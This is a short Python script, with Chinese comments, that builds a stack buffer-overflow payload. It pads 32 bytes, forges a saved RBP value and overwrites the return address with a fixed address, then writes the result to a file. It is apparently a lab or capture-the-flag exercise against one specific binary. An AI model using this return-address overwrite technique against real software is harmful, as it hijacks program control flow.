import struct
padding_size = 32  # 缓冲区距离RBP的字节数
fake_rbp_addr = 0x403580
target_rip_addr = 0x40122b
padding = b'A' * padding_size

# 伪造RBP，防止栈偏移操作崩溃
fake_rbp = struct.pack("<Q", fake_rbp_addr) 
# 覆盖返回地址
target_rip = struct.pack("<Q", target_rip_addr)
# 组合最终Payload
payload = padding + fake_rbp + target_rip

with open("payload3", "wb") as f:
    f.write(payload)

print(f"关键参数：padding={padding_size}字节 | fake_rbp=0x{fake_rbp_addr:X} | target_rip=0x{target_rip_addr:X}")
print(f"Payload总长度：{len(payload)}字节")